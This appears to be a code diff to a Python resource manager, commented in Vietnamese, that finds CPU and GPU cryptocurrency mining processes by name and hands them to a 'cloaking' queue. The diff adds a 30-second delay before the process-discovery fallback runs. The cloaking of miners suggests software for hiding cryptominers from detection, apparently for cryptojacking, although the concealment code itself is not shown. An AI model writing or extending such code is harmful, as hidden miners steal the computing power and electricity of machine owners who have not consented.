@@ -662,11 +662,19 @@ class ResourceManager(IResourceManager):
                         self.logger.error("Timeout khi acquire lock discover_mining_processes.")
                         continue
 
-                    # **FALLBACK ONLY** - Chỉ chạy nếu chưa nhận PID từ EventBus
+                    # **ENHANCED FALLBACK MECHANISM** - Chỉ chạy sau 30 giây nếu chưa nhận PID từ EventBus
                     received_pids_from_eventbus = len(self.mining_processes) > 0
+                    current_time = time.time()
                     
-                    if not received_pids_from_eventbus:
-                        self.logger.warning("⚠️ Fallback: No PIDs received from EventBus, using process discovery")
+                    # Kiểm tra xem đã đủ 30 giây chưa để kích hoạt fallback
+                    if not hasattr(self, '_fallback_start_time'):
+                        self._fallback_start_time = current_time
+                    
+                    fallback_timeout = 30.0  # 30 seconds
+                    time_since_start = current_time - self._fallback_start_time
+                    
+                    if not received_pids_from_eventbus and time_since_start >= fallback_timeout:
+                        self.logger.warning("⚠️ Fallback: No PIDs received from EventBus after 30s, using process discovery")
                         self.mining_processes.clear()
                         
                         for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
@@ -678,7 +686,7 @@ class ResourceManager(IResourceManager):
                                 
                                 # Phát hiện CPU mining processes
                                 if cpu_process_name in process_name or cpu_process_name in cmdline_str:
-                                    self.logger.info(f"Đã phát hiện CPU mining process: {process_name} (PID={proc.info['pid']})")
+                                    self.logger.info(f"Fallback: Đã phát hiện CPU mining process: {process_name} (PID={proc.info['pid']})")
                                     prio = self.get_process_priority(process_name)
                                     net_if = self.config.network_interface
                                     mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
@@ -688,7 +696,7 @@ class ResourceManager(IResourceManager):
                                 
                                 # Phát hiện GPU mining processes
                                 elif gpu_process_name in process_name or gpu_process_name in cmdline_str:
-                                    self.logger.info(f"Đã phát hiện GPU mining process: {process_name} (PID={proc.info['pid']})")
+                                    self.logger.info(f"Fallback: Đã phát hiện GPU mining process: {process_name} (PID={proc.info['pid']})")
                                     prio = self.get_process_priority(process_name)
                                     net_if = self.config.network_interface
                                     mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
@@ -697,15 +705,21 @@ class ResourceManager(IResourceManager):
                                     mining_processes.append(mining_process)
                                     self.mining_processes.append(mining_process)
                                     self.enqueue_cloaking(mining_process)
-                    else:
+                                
+                                # Cập nhật process states
+                                if mining_process and mining_process.pid not in self.process_states:
+                                    self.process_states[mining_process.pid] = "normal"
+                                    
+                            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                                continue
+                    
+                    elif received_pids_from_eventbus:
                         self.logger.info("✅ EventBus PID propagation working - skipping process discovery fallback")
-                            
-                            # Cập nhật process states
-                            if mining_process and mining_process.pid not in self.process_states:
-                                self.process_states[mining_process.pid] = "normal"
-                            
-                        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                            continue
+                    
+                    elif time_since_start < fallback_timeout:
+                        self.logger.info(f"⏰ Waiting for EventBus PIDs... ({time_since_start:.1f}s/{fallback_timeout}s)")
+                        # Trả về empty list để trigger retry
+                        return []
                     
                     self.logger.info(f"Đã phát hiện {len(mining_processes)} tiến trình mining.")
                     self.mining_processes_lock.release()
